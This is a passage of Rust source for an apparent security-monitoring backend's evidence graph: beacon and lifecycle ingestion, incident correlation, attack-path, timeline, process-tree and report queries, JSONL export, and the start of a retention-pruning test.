                     ON CONFLICT (id) DO UPDATE SET verdict=excluded.verdict, detail=excluded.detail, ts=excluded.ts",
                    params![gnode, stage, verdict, detail, version, gts])?;
                self.add_edge(&rel_id, EDGE_VALIDATED_BY, &gnode, 0.0)?;
            }
        }
        Ok(Some(rel_id))
    }

    /// Ingest a schema-1 `beacon.json` (ADR 0012 D5 opt-in product-health beacon) → a `beacons` node,
    /// plus a `measured_on` edge beacon→release when a `releases` node with a matching `image_version`
    /// already exists (release ingest is not a precondition — a beacon can arrive first and simply not
    /// link yet). Only lifecycle signal is stored, per D5: never security telemetry or customer data.
    pub fn ingest_beacon(&self, json: &str) -> Result<Option<String>> {
        let v: serde_json::Value = serde_json::from_str(json).context("parse beacon.json")?;
        let schema = v["schema"].as_i64().unwrap_or(0);
        if schema != 1 {
            anyhow::bail!("beacon.json: unsupported schema {schema} (expected 1)");
        }
        let kind = v["kind"].as_str().unwrap_or("");
        if kind != "beacon" {
            anyhow::bail!("beacon.json: expected kind=\"beacon\", got {kind:?}");
        }
        let beacon_id = v["beacon_id"].as_str().unwrap_or("");
        if beacon_id.is_empty() {
            anyhow::bail!("beacon.json: missing beacon_id");
        }
        let image_version = v["image_version"].as_str().unwrap_or("");
        let device_class = v["device_class"].as_str().unwrap_or("");
        let profile = v["profile"].as_str().unwrap_or("");
        let boot_healthy = v["boot"]["healthy"].as_i64().unwrap_or(0);
        let boot_unhealthy = v["boot"]["unhealthy"].as_i64().unwrap_or(0);
        let rollbacks = v["boot"]["rollbacks"].as_i64().unwrap_or(0);
        let healed = v["health"]["healed"].as_i64().unwrap_or(0);
        let failed = v["health"]["failed"].as_i64().unwrap_or(0);
        let shed = v["health"]["shed"].as_i64().unwrap_or(0);
        let reverted = v["health"]["reverted"].as_i64().unwrap_or(0);
        let qsecbit_avg = v["qsecbit_avg"].as_f64().unwrap_or(0.0);
        let ts = v["ts"].as_str().unwrap_or("");
        let bnode = sid("beacon", beacon_id);
        self.conn.execute(
            "INSERT INTO beacons VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET \
               boot_healthy=excluded.boot_healthy, boot_unhealthy=excluded.boot_unhealthy, rollbacks=excluded.rollbacks, \
               healed=excluded.healed, failed=excluded.failed, shed=excluded.shed, reverted=excluded.reverted, \
               qsecbit_avg=excluded.qsecbit_avg, ts=excluded.ts",
            params![bnode, beacon_id, image_version, device_class, profile,
                    boot_healthy, boot_unhealthy, rollbacks, healed, failed, shed, reverted, qsecbit_avg, ts])?;

        let rel_id: Option<String> = self.conn
            .query_row("SELECT id FROM releases WHERE version=? LIMIT 1", params![image_version], |r| r.get(0))
            .optional()?;
        if let Some(rel_id) = rel_id {
            self.add_edge(&bnode, EDGE_MEASURED_ON, &rel_id, 0.0)?;
        }
        Ok(Some(bnode))
    }

    /// The ADR 0011 D1 field-feedback edge: any evidence-graph node (an incident, a detection, a
    /// beacon…) → a `requirements` node, closing the loop from production/field evidence back into the
    /// roadmap. Creates the requirement node if it doesn't exist yet (a requirement can be born from
    /// its first piece of field evidence, not only from a planning doc). Returns the requirement id.
    pub fn link_feedback(&self, src_id: &str, req_slug: &str, title: Option<&str>) -> Result<String> {
        let req_id = sid("req", req_slug);
        self.conn.execute(
            "INSERT INTO requirements VALUES (?,?,?,?) ON CONFLICT (id) DO NOTHING",
            params![req_id, req_slug, title.unwrap_or(req_slug), "field-feedback"])?;
        self.add_edge(src_id, EDGE_INFORMED_BY, &req_id, 0.0)?;
        Ok(req_id)
    }

    /// Ingest a dev-time lifecycle event log (ADR 0013) — JSONL from the Claude Code `cortex-emit`
    /// hooks, one `{kind,session,ts,summary,detail}` per line (kind ∈ intent|change|gate|red_action).
    /// Builds a `session` node + a `lifecycle_events` node per line, links each event into its session
    /// (`in_session`), and links every non-intent event to the MOST-RECENT intent in the same session
    /// (`led_to`) — so "which prompt led to these changes and these gate results" is a graph query.
    /// Idempotent (node + edge PKs). C9: this records the development lifecycle, it never enforces.
    /// Returns the number of events ingested.
    pub fn ingest_lifecycle_file(&self, path: &Path) -> Result<usize> {
        let text = std::fs::read_to_string(path).with_context(|| format!("read {path:?}"))?;
        // Per-session anchor: the id of the latest `intent` event seen, so a change/gate links back to
        // the prompt that produced it. A new intent in the same session re-anchors (a new prompt).
        let mut latest_intent: std::collections::HashMap<String, String> = std::collections::HashMap::new();
        let mut n = 0usize;
        self.begin()?;
        for line in text.lines() {
            let line = line.trim();
            if line.is_empty() {
                continue;
            }
            let v: serde_json::Value = match serde_json::from_str(line) {
                Ok(v) => v,
                Err(_) => continue, // fail-open: one bad line never aborts the batch
            };
            let kind = v["kind"].as_str().unwrap_or("");
            if kind.is_empty() {
                continue;
            }
            let sess = v["session"].as_str().unwrap_or("unknown");
            let ts = v["ts"].as_str().unwrap_or("");
            let summary = v["summary"].as_str().unwrap_or("");
            let detail = v["detail"].as_str().unwrap_or("");
            let sess_node = sid("session", sess);
            // session: first_ts set once (INSERT), last_ts advances on every event (conflict update)
            self.conn.execute(
                "INSERT INTO sessions VALUES (?,?,?,?,?) \
                 ON CONFLICT (id) DO UPDATE SET last_ts=excluded.last_ts",
                params![sess_node, sess, ts, ts, ""],
            )?;
            let ev_id = sid("lc", &format!("{sess}|{ts}|{kind}|{summary}"));
            self.conn.execute(
                "INSERT INTO lifecycle_events VALUES (?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
                params![ev_id, sess, kind, ts, summary, detail],
            )?;
            self.add_edge(&sess_node, EDGE_IN_SESSION, &ev_id, 0.0)?;
            if kind == "intent" {
                self.conn.execute(
                    "UPDATE sessions SET intent=? WHERE id=?",
                    params![summary, sess_node],
                )?;
                latest_intent.insert(sess.to_string(), ev_id.clone());
            } else if let Some(intent_id) = latest_intent.get(sess) {
                self.add_edge(intent_id, EDGE_LED_TO, &ev_id, 0.0)?;
            }
            n += 1;
        }
        self.commit()?;
        Ok(n)
    }

    /// Correlate all detections on a device into one Incident node (the "one traceable story"), linked
    /// to the device + every detection. Returns the incident id.
    pub fn correlate_incident(&self, device_ip: &str, title: &str) -> Result<String> {
        // Severity is 1=CRITICAL … 5=INFO, so the incident takes its WORST (lowest non-zero)
        // detection. (Was max(severity)/3 + "High if >=2": priority came from the LEAST severe
        // detection and the score could exceed 1.0.) 0 = unknown, ignored.
        let (cnt, worst, ts): (i64, i64, f64) = self.conn.query_row(
            "SELECT count(*), coalesce(min(CASE WHEN severity > 0 THEN severity END),5), coalesce(max(ts),0) FROM detections WHERE src_ip=?",
            params![device_ip], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))?;
        if cnt == 0 { anyhow::bail!("no detections for {device_ip}"); }
        let inc_id = sid("inc", &format!("{device_ip}@{}", ts as i64));
        let dev_id = sid("dev", device_ip);
        let worst = worst.clamp(1, 5);
        let score = (6 - worst) as f64 / 5.0;
        self.conn.execute(
            "INSERT INTO incidents VALUES (?,?,?,?,?,?,?) ON CONFLICT (id) DO UPDATE SET threat_score=excluded.threat_score",
            params![inc_id, ts, title, device_ip, if worst <= SEV_HIGH { "High" } else { "Medium" }, "new", score])?;
        self.add_edge(&inc_id, "incident_on_device", &dev_id, ts)?;
        // cap fan-out: a spoofed src_ip with a flood of detections would otherwise create a huge hub
        // node → the attack_path traversal blows up. 10k linked detections is far beyond any real incident.
        let mut stmt = self.conn.prepare("SELECT id FROM detections WHERE src_ip=? LIMIT 10000")?;
        let dets: Vec<String> = stmt.query_map(params![device_ip], |r| r.get::<_, String>(0))?.filter_map(|r| r.ok()).collect();
        for d in dets { self.add_edge(&inc_id, "incident_includes_detection", &d, ts)?; }
        Ok(inc_id)
    }

    /// Attack path: the connected subgraph reachable from an incident (both edge directions, bounded
    /// depth) — this IS the Threat Graph the dashboard renders. Returns nodes/edges + the edge-type
    /// progression as JSON (a recursive CTE, fast for a per-incident subgraph).
    pub fn attack_path(&self, incident_id: &str) -> Result<String> {
        let reach = REACH_CTE;
        // Nodes with a human LABEL (COALESCE across node tables) + type (id prefix), ordered by depth
        // so the attack-chain core (incident→detection→flow→device) survives the LIMIT before the
        // process flood. Bounded — a real render caps node count.
        let node_sql = format!("{reach}
            SELECT rs.node_id, rs.depth,
              COALESCE(dv.ip, dt.rule_msg, fl.dst_ip, pr.name, fi.path, rk.key, cr.principal, inc.title, io.indicator, rp.detail,
                       ifc.label, NULLIF(ap.http_host,''), NULLIF(ap.sni,''),
                       -- roadmap-B: label a TLS app by its JA4/JA4S when it has no Host/SNI (encrypted-SNI
                       -- or IP-only flows) instead of a generic tls-service label (audit GAP-2). NULLIF
                       -- above also fixes the latent empty-string-stops-COALESCE case for host/sni.
                       CASE WHEN ap.ja4  != '' THEN 'JA4 '  || ap.ja4  END,
                       CASE WHEN ap.ja4s != '' THEN 'JA4S ' || ap.ja4s END,
                       ap.service, us.principal, (ns.src_ip || ' -> ' || ns.dst_ip), rep.title,
                       (vu.cve || ' (' || vu.component || ')'), (vx.cve || ': ' || vx.status), '') AS label
            FROM rs
            LEFT JOIN devices dv       ON dv.id  = rs.node_id
            LEFT JOIN detections dt    ON dt.id  = rs.node_id
            LEFT JOIN flows fl         ON fl.id  = rs.node_id
            LEFT JOIN processes pr     ON pr.id  = rs.node_id
            LEFT JOIN files fi         ON fi.id  = rs.node_id
            LEFT JOIN registry_keys rk ON rk.id  = rs.node_id
            LEFT JOIN credentials cr   ON cr.id  = rs.node_id
            LEFT JOIN incidents inc    ON inc.id = rs.node_id
            LEFT JOIN iocs io          ON io.id  = rs.node_id
            LEFT JOIN responses rp     ON rp.id  = rs.node_id
            LEFT JOIN interfaces ifc   ON ifc.id = rs.node_id
            LEFT JOIN applications ap  ON ap.id  = rs.node_id
            LEFT JOIN users us         ON us.id  = rs.node_id
            LEFT JOIN net_sessions ns  ON ns.id  = rs.node_id
            LEFT JOIN reports rep      ON rep.id = rs.node_id
            LEFT JOIN vulns vu         ON vu.id  = rs.node_id
            LEFT JOIN vex_findings vx  ON vx.id  = rs.node_id
            -- structural nodes (device/flow/incident/process/file/…) FIRST, then the mass of
            -- detections/iocs, so a device with 100s of alerts can't crowd the device+flows out of the
            -- LIMIT — the threat graph must always show the attack path's skeleton.
            ORDER BY (CASE WHEN rs.node_id LIKE 'det:%' OR rs.node_id LIKE 'ioc:%' THEN 1 ELSE 0 END), rs.depth ASC
            LIMIT 200");
        let mut nstmt = self.conn.prepare(&node_sql)?;
        let nodes: Vec<(String, String)> = nstmt
            .query_map(params![incident_id], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(2)?)))?
            .filter_map(|r| r.ok())
            .collect();
        let ids: std::collections::HashSet<&str> = nodes.iter().map(|(id, _)| id.as_str()).collect();
        let mut estmt = self.conn.prepare(&format!(
            "{reach} SELECT src_id, edge_type, dst_id FROM edges \
             WHERE src_id IN (SELECT node_id FROM rs) AND dst_id IN (SELECT node_id FROM rs)"))?;
        let edges: Vec<(String, String, String)> = estmt
            .query_map(params![incident_id], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?, r.get::<_, String>(2)?)))?
            .filter_map(|r| r.ok())
            .filter(|(s, _, d)| ids.contains(s.as_str()) && ids.contains(d.as_str())) // no dangling edges past the LIMIT
            .collect();
        // serde_json — labels are attacker-controlled (process names, file paths, domains, rule msgs);
        // a raw `"`, `\`, newline, or control byte would otherwise corrupt the graph the dashboard renders.
        let nodes_json: Vec<serde_json::Value> = nodes.iter().map(|(id, label)| {
            serde_json::json!({"id": id, "type": id.split(':').next().unwrap_or(""), "label": label})
        }).collect();
        let edges_json: Vec<serde_json::Value> = edges.iter().map(|(s, t, d)| {
            serde_json::json!({"src": s, "type": t, "dst": d})
        }).collect();
        Ok(serde_json::json!({
            "incident": incident_id,
            "node_count": nodes.len(),
            "edge_count": edges.len(),
            "nodes": nodes_json,
            "edges": edges_json,
        }).to_string())
    }

    /// The incident's evidence-graph subgraph re-projected as a ts-ordered NARRATIVE — the
    /// Investigate workspace's timeline view (`/api/incidents/:id/timeline`). Reuses the SAME
    /// `REACH_CTE` `attack_path` builds on (never a second traversal implementation), then pulls
    /// every TIMESTAMPED node type in that subgraph (detections/flows/responses/processes/files/
    /// registry keys/the incident itself) into one `ORDER BY ts ASC` narrative. Returns
    /// `{"found":false}` (never an error) for an unknown incident id — same "safe to probe" shape
    /// `lifecycle_trace` already uses.
    pub fn incident_timeline(&self, incident_id: &str) -> Result<String> {
        let exists: bool = self.conn
            .query_row("SELECT 1 FROM incidents WHERE id=?", params![incident_id], |_| Ok(()))
            .optional()?
            .is_some();
        if !exists {
            return Ok(serde_json::json!({"incident": incident_id, "found": false}).to_string());
        }
        let sql = format!("{REACH_CTE}
            SELECT id, ts, kind, label FROM (
              SELECT dt.id AS id, dt.ts AS ts, 'detection' AS kind, dt.rule_msg AS label FROM rs JOIN detections dt ON dt.id = rs.node_id
              UNION ALL
              SELECT fl.id, fl.ts, 'flow', (fl.src_ip || ':' || fl.src_port || ' -> ' || fl.dst_ip || ':' || fl.dst_port) FROM rs JOIN flows fl ON fl.id = rs.node_id
              UNION ALL
              SELECT rp.id, rp.ts, 'response', (rp.action || ' ' || rp.target || ' (' || rp.status || ')') FROM rs JOIN responses rp ON rp.id = rs.node_id
              UNION ALL
              SELECT pr.id, pr.ts, 'process', pr.name FROM rs JOIN processes pr ON pr.id = rs.node_id
              UNION ALL
              SELECT fi.id, fi.ts, 'file', fi.path FROM rs JOIN files fi ON fi.id = rs.node_id
              UNION ALL
              SELECT rk.id, rk.ts, 'registry', rk.key FROM rs JOIN registry_keys rk ON rk.id = rs.node_id
              UNION ALL
              SELECT inc.id, inc.ts, 'incident', inc.title FROM rs JOIN incidents inc ON inc.id = rs.node_id
            )
            ORDER BY ts ASC");
        let mut stmt = self.conn.prepare(&sql)?;
        let events: Vec<serde_json::Value> = stmt
            .query_map(params![incident_id], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "kind": r.get::<_, String>(2)?,
                    "label": r.get::<_, String>(3)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({
            "incident": incident_id,
            "found": true,
            "count": events.len(),
            "events": events,
        }).to_string())
    }

    /// The incident's HOST-layer process tree — walks `spawned_by` edges among every `processes`
    /// node in the incident's subgraph (the Investigate workspace's process-tree view,
    /// `/api/incidents/:id/processes`). A process with no parent WITHIN this subgraph (its own
    /// `parent_pid` is 0, or its parent process simply never entered the incident) is a root —
    /// exactly like a real process tree rendered from an arbitrary observation window. Bounded
    /// recursion depth (32) defends against a maliciously-crafted pid/parent_pid cycle in
    /// attacker-controlled telemetry; real process trees never approach that depth. Returns
    /// `{"found":false}` for an unknown incident id.
    pub fn incident_process_tree(&self, incident_id: &str) -> Result<String> {
        let exists: bool = self.conn
            .query_row("SELECT 1 FROM incidents WHERE id=?", params![incident_id], |_| Ok(()))
            .optional()?
            .is_some();
        if !exists {
            return Ok(serde_json::json!({"incident": incident_id, "found": false}).to_string());
        }
        struct Proc { id: String, ts: f64, device_ip: String, pid: i64, name: String, cmdline: String }
        let sql = format!(
            "{REACH_CTE} SELECT pr.id, pr.ts, pr.device_ip, pr.pid, pr.name, pr.cmdline FROM rs JOIN processes pr ON pr.id = rs.node_id");
        let mut stmt = self.conn.prepare(&sql)?;
        let procs: Vec<Proc> = stmt
            .query_map(params![incident_id], |r| {
                Ok(Proc {
                    id: r.get(0)?, ts: r.get(1)?, device_ip: r.get(2)?, pid: r.get(3)?,
                    name: r.get(4)?, cmdline: r.get(5)?,
                })
            })?
            .filter_map(|r| r.ok())
            .collect();
        let ids: std::collections::HashSet<&str> = procs.iter().map(|p| p.id.as_str()).collect();
        let mut estmt = self.conn.prepare("SELECT src_id, dst_id FROM edges WHERE edge_type='spawned_by'")?;
        let spawn_edges: Vec<(String, String)> = estmt
            .query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?)))?
            .filter_map(|r| r.ok())
            .filter(|(child, parent)| ids.contains(child.as_str()) && ids.contains(parent.as_str()))
            .collect();
        let mut children: std::collections::HashMap<&str, Vec<&str>> = std::collections::HashMap::new();
        let mut has_parent_in_set: std::collections::HashSet<&str> = std::collections::HashSet::new();
        for (child, parent) in &spawn_edges {
            children.entry(parent.as_str()).or_default().push(child.as_str());
            has_parent_in_set.insert(child.as_str());
        }
        let by_id: std::collections::HashMap<&str, &Proc> = procs.iter().map(|p| (p.id.as_str(), p)).collect();
        fn build_node(
            id: &str,
            by_id: &std::collections::HashMap<&str, &Proc>,
            children: &std::collections::HashMap<&str, Vec<&str>>,
            depth: usize,
        ) -> serde_json::Value {
            let p = by_id[id];
            let kids: Vec<serde_json::Value> = if depth >= 32 {
                vec![] // cycle/depth guard — see the doc comment above
            } else {
                children.get(id)
                    .map(|cs| cs.iter().map(|c| build_node(c, by_id, children, depth + 1)).collect())
                    .unwrap_or_default()
            };
            serde_json::json!({
                "id": id, "ts": p.ts, "device_ip": p.device_ip, "pid": p.pid,
                "name": p.name, "cmdline": p.cmdline, "children": kids,
            })
        }
        let mut roots: Vec<&str> = procs.iter().map(|p| p.id.as_str())
            .filter(|id| !has_parent_in_set.contains(id))
            .collect();
        roots.sort_unstable(); // deterministic ordering
        let roots_json: Vec<serde_json::Value> = roots.iter()
            .map(|id| build_node(id, &by_id, &children, 0))
            .collect();
        Ok(serde_json::json!({
            "incident": incident_id,
            "found": true,
            "process_count": procs.len(),
            "roots": roots_json,
        }).to_string())
    }

    /// Assemble the executive-facing `Report` node for an incident — the MissionControl-required
    /// TERMINUS of the evidence chain ("an executive report links back to the raw evidence").
    /// Composes ONLY already-computed data (`attack_path`, `incident_timeline`,
    /// `incident_process_tree`, the MITRE techniques of the incident's own linked detections, and
    /// the response(s) taken) into one structured JSON document, stores it as a `reports` node
    /// keyed on the incident (re-generating OVERWRITES the same node — one report per incident,
    /// always current), and edge-links it BACK to every evidence node it cites
    /// (`report_cites_evidence`) plus the incident it covers (`report_covers_incident`) — so
    /// drilling INTO a report from Mission Control can walk back OUT to the raw flow/detection/
    /// process/response nodes that produced it. Returns `Ok(None)` for an unknown incident id.
    pub fn generate_report(&self, incident_id: &str) -> Result<Option<String>> {
        let row: Option<(f64, String, String, String, String, f64)> = self.conn
            .query_row(
                "SELECT ts, title, device_ip, priority, status, threat_score FROM incidents WHERE id=?",
                params![incident_id], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?, r.get(5)?)))
            .optional()?;
        let Some((_ts, title, device_ip, priority, status, threat_score)) = row else { return Ok(None) };
        // Computed up front (deterministic over incident_id alone — see below) so it can be
        // excluded from `evidence_node_ids`: on a RE-generation, the report node from the PREVIOUS
        // run is itself part of the incident's reachable subgraph (the reach traversal walks edges
        // in both directions, and `report_covers_incident` points straight back at the incident) —
        // without this exclusion a re-run would cite itself, growing the edge set by one every time.
        let rep_id = sid("report", incident_id);

        let path_json = self.attack_path(incident_id)?;
        let path: serde_json::Value = serde_json::from_str(&path_json).context("parse attack_path json")?;
        let timeline_json = self.incident_timeline(incident_id)?;
        let timeline: serde_json::Value = serde_json::from_str(&timeline_json).context("parse incident_timeline json")?;
        let proc_tree_json = self.incident_process_tree(incident_id)?;
        let proc_tree: serde_json::Value = serde_json::from_str(&proc_tree_json).context("parse incident_process_tree json")?;

        let mitre_techniques: Vec<String> = {
            let mut stmt = self.conn.prepare(
                "SELECT DISTINCT dt.mitre FROM edges e JOIN detections dt ON dt.id = e.dst_id \
                 WHERE e.src_id = ? AND e.edge_type = 'incident_includes_detection' AND dt.mitre <> ''")?;
            let rows: Vec<String> = stmt.query_map(params![incident_id], |r| r.get::<_, String>(0))?
                .filter_map(|r| r.ok()).collect();
            rows
        };
        let response_taken: Vec<serde_json::Value> = {
            let mut stmt = self.conn.prepare(
                "SELECT DISTINCT rp.id, rp.ts, rp.action, rp.target, rp.mechanism, rp.detail, rp.status \
                 FROM edges e1 JOIN edges e2 ON e2.src_id = e1.dst_id JOIN responses rp ON rp.id = e2.dst_id \
                 WHERE e1.src_id = ? AND e1.edge_type = 'incident_includes_detection' AND e2.edge_type = 'responded_with'")?;
            let rows: Vec<serde_json::Value> = stmt.query_map(params![incident_id], |r| Ok(serde_json::json!({
                "id": r.get::<_, String>(0)?, "ts": r.get::<_, f64>(1)?, "action": r.get::<_, String>(2)?,
                "target": r.get::<_, String>(3)?, "mechanism": r.get::<_, String>(4)?,
                "detail": r.get::<_, String>(5)?, "status": r.get::<_, String>(6)?,
            })))?.filter_map(|r| r.ok()).collect();
            rows
        };
        let evidence_node_ids: Vec<String> = path["nodes"].as_array().map(|ns| {
            ns.iter().filter_map(|n| n["id"].as_str().map(|s| s.to_string()))
              // the incident itself is cited via report_covers_incident; the report's OWN node
              // (reachable on a re-generation — see the doc comment on `rep_id` above) must never
              // cite itself.
              .filter(|id| id != incident_id && id != &rep_id)
              .collect()
        }).unwrap_or_default();

        let confidence = (threat_score * 100.0).round();
        let now = now_ts();
        let body = serde_json::json!({
            "incident_id": incident_id,
            "title": title,
            "device_ip": device_ip,
            "priority": priority,
            "status": status,
            "confidence": confidence,
            "mitre_techniques": mitre_techniques,
            "timeline": timeline["events"],
            "process_tree": proc_tree["roots"],
            "response_taken": response_taken,
            "evidence_node_ids": evidence_node_ids,
            "generated_ts": now,
        });
        let summary = format!(
            "Incident '{title}' on {device_ip}: {} evidence node(s), {} response action(s), confidence {:.0}%.",
            evidence_node_ids.len(), response_taken.len(), confidence);

        // (rep_id keyed on the incident id alone — computed up front, see above — one report PER
        // incident; re-generating updates it in place rather than piling up duplicates.)
        self.conn.execute(
            "INSERT INTO reports VALUES (?,?,?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET ts=excluded.ts, title=excluded.title, summary=excluded.summary, body_json=excluded.body_json",
            params![rep_id, now, incident_id, title, summary, body.to_string()])?;
        self.add_edge(&rep_id, "report_covers_incident", incident_id, now)?;
        for eid in &evidence_node_ids {
            self.add_edge(&rep_id, "report_cites_evidence", eid, now)?;
        }
        Ok(Some(rep_id))
    }

    /// Latest N reports, newest-generated first — the read-API's `/api/reports` (the
    /// MissionControl evidence-chain terminus list). Read-only.
    pub fn list_reports(&self, limit: i64) -> Result<String> {
        let limit = limit.clamp(1, 500);
        let mut stmt = self.conn.prepare(
            "SELECT id, ts, incident_id, title, summary FROM reports ORDER BY ts DESC LIMIT ?")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "incident_id": r.get::<_, String>(2)?,
                    "title": r.get::<_, String>(3)?,
                    "summary": r.get::<_, String>(4)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        Ok(serde_json::json!({"count": rows.len(), "reports": rows}).to_string())
    }

    /// One report's full document (`/api/reports/:id`) — `report` is the whole structured body
    /// (`generate_report`'s JSON: summary/timeline/MITRE techniques/evidence node ids/confidence/
    /// response taken), the exact drill-back-to-raw-evidence artifact MissionControl.md calls for.
    /// Returns `Ok(None)` for an unknown report id (404 at the HTTP layer).
    pub fn report_detail(&self, report_id: &str) -> Result<Option<String>> {
        let row: Option<(f64, String, String, String, String)> = self.conn
            .query_row(
                "SELECT ts, incident_id, title, summary, body_json FROM reports WHERE id=?",
                params![report_id], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?)))
            .optional()?;
        let Some((ts, incident_id, title, summary, body_json)) = row else { return Ok(None) };
        let body: serde_json::Value = serde_json::from_str(&body_json).unwrap_or(serde_json::Value::Null);
        Ok(Some(serde_json::json!({
            "id": report_id,
            "ts": ts,
            "incident_id": incident_id,
            "title": title,
            "summary": summary,
            "report": body,
        }).to_string()))
    }

    /// Export each table as JSONEachRow (one JSON object per line) — the format ClickHouse ingests
    /// natively (`INSERT INTO … FORMAT JSONEachRow`). The edge→cloud offload artifact for the mesh
    /// gateway → `hookprobe_ids` (ADR 0009 revised: SQLite edge, ClickHouse cloud). Column names/values
    /// come from the live schema, so it tracks table changes automatically.
    pub fn export_jsonl(&self, dir: &Path) -> Result<()> {
        use std::io::Write;
        for t in ["flows", "detections", "devices", "edges", "processes", "files",
                  "registry_keys", "credentials", "incidents", "iocs", "responses",
                  "adrs", "requirements", "commits", "releases", "gate_results", "beacons",
                  "sessions", "lifecycle_events", "qsecbit_scores", "attack_runs", "findings",
                  "interfaces", "applications", "users", "net_sessions", "reports"] {
            let mut stmt = self.conn.prepare(&format!("SELECT * FROM {t}"))?;
            let cols: Vec<String> = stmt.column_names().iter().map(|s| s.to_string()).collect();
            let file = std::fs::File::create(dir.join(format!("{t}.jsonl")))?;
            let mut w = std::io::BufWriter::new(file);
            let rows = stmt.query_map([], |r| {
                let mut obj = serde_json::Map::with_capacity(cols.len());
                for (i, name) in cols.iter().enumerate() {
                    let v = match r.get_ref(i)? {
                        rusqlite::types::ValueRef::Null => serde_json::Value::Null,
                        rusqlite::types::ValueRef::Integer(n) => serde_json::json!(n),
                        rusqlite::types::ValueRef::Real(f) => serde_json::json!(f),
                        rusqlite::types::ValueRef::Text(s) => serde_json::json!(String::from_utf8_lossy(s)),
                        rusqlite::types::ValueRef::Blob(b) => serde_json::json!(b),
                    };
                    obj.insert(name.clone(), v);
                }
                Ok(serde_json::Value::Object(obj))
            })?;
            for row in rows {
                writeln!(w, "{}", row?)?;
            }
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- Retention / prune (backend-audit gap 1) --------------------------------------------

    fn days_ago(days: f64) -> f64 {
        now_ts() - days * 86400.0
    }

    fn flow_line(ts: f64, src_ip: &str, dst_ip: &str, dst_port: i64) -> String {
        format!(
            "{{\"type\":\"conn\",\"ts\":{ts},\"src_ip\":\"{src_ip}\",\"src_port\":51000,\"dst_ip\":\"{dst_ip}\",\"dst_port\":{dst_port},\"proto\":\"tcp\",\"conn_state\":\"S0\",\"orig_bytes\":0,\"resp_bytes\":0}}"
        )
    }

    fn detection_line(ts: f64, rule_id: i64, src_ip: &str, dst_ip: &str, dst_port: i64) -> String {
        format!(
            "{{\"ts\":{ts},\"rule_id\":{rule_id},\"rule_msg\":\"test detection\",\"category\":\"test\",\"severity\":2,\"mitre\":\"T1110\",\"src_ip\":\"{src_ip}\",\"dst_ip\":\"{dst_ip}\",\"dst_port\":{dst_port},\"confidence\":0.9}}"
        )
    }

    /// Generic integrity check: every edge's src_id/dst_id must resolve to SOME row across every
    /// node table this crate defines — a dangling edge (an endpoint that no longer exists anywhere)
    /// is exactly the bug the prune cascade must never leave behind. Deliberately checks ALL node
    /// tables (not just the ones `prune` touches) so a mistake that ONLY cascades against some
    /// tables would still be caught.
    fn assert_no_dangling_edges(g: &EvidenceGraph) {
        const ALL_NODE_TABLES: &[&str] = &[
            "devices", "interfaces", "flows", "net_sessions", "applications", "users",
            "detections", "pcaps", "processes", "files", "registry_keys", "credentials",
            "incidents", "reports", "iocs", "responses", "adrs", "requirements", "commits",
            "releases", "gate_results", "beacons", "sessions", "lifecycle_events",
            "qsecbit_scores", "attack_runs", "findings",
        ];
        let exists_sql = ALL_NODE_TABLES
            .iter()
            .map(|t| format!("SELECT id FROM {t}"))
            .collect::<Vec<_>>()
            .join(" UNION ALL ");
        let dangling: i64 = g
            .conn
            .query_row(
                &format!(
                    "SELECT count(*) FROM edges e WHERE \
                     e.src_id NOT IN ({exists_sql}) OR e.dst_id NOT IN ({exists_sql})"
                ),
                [],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(dangling, 0, "prune must never leave a dangling edge (an endpoint that exists nowhere)");
    }

    #[test]
    fn prune_deletes_nodes_older_than_retention_and_keeps_recent_with_no_dangling_edges() {
        let g = EvidenceGraph::open_memory().unwrap();
        let old_ts = days_ago(200.0);
        let recent_ts = days_ago(1.0);

        // Old device (A): a flow + a matching detection, both 200 days old.
        g.ingest_flow(&flow_line(old_ts, "203.0.113.10", "192.168.1.1", 22)).unwrap();
        let old_det = g
            .ingest_detection(&detection_line(old_ts, 1000001, "203.0.113.10", "192.168.1.1", 22))
            .unwrap()
            .unwrap();
        // Recent device (B): a flow + a matching detection, both 1 day old.
        g.ingest_flow(&flow_line(recent_ts, "203.0.113.20", "192.168.1.2", 22)).unwrap();
        let recent_det = g
            .ingest_detection(&detection_line(recent_ts, 1000001, "203.0.113.20", "192.168.1.2", 22))
            .unwrap()
            .unwrap();

        let (dev_before, flow_before, det_before, _) = g.counts().unwrap();
        assert_eq!(dev_before, 2);
        assert_eq!(flow_before, 2);
        assert_eq!(det_before, 2);

        let stats = g.prune(30.0, None).unwrap();
        assert_eq!(stats.retention_days, 30.0);
        assert!(stats.deleted_nodes > 0, "the 200-day-old rows must be deleted");

        let (dev_after, flow_after, det_after, _) = g.counts().unwrap();
        assert_eq!(dev_after, 1, "only the recent device remains");
        assert_eq!(flow_after, 1, "only the recent flow remains");
        assert_eq!(det_after, 1, "only the recent detection remains");

        // The recent detection/device are exactly the ones that survived (never the old ones).
        let recent_ip: String = g.conn.query_row("SELECT ip FROM devices", [], |r| r.get(0)).unwrap();
        assert_eq!(recent_ip, "203.0.113.20");

        // The OLD detection's own id must be completely gone, not just unreachable.
        let old_det_exists: i64 = g
            .conn
            .query_row("SELECT count(*) FROM detections WHERE id=?", params![old_det], |r| r.get(0))
            .unwrap();
        assert_eq!(old_det_exists, 0);
        let recent_det_exists: i64 = g
            .conn
            .query_row("SELECT count(*) FROM detections WHERE id=?", params![recent_det], |r| r.get(0))
            .unwrap();
        assert_eq!(recent_det_exists, 1);

        assert_no_dangling_edges(&g);
    }

    #[test]
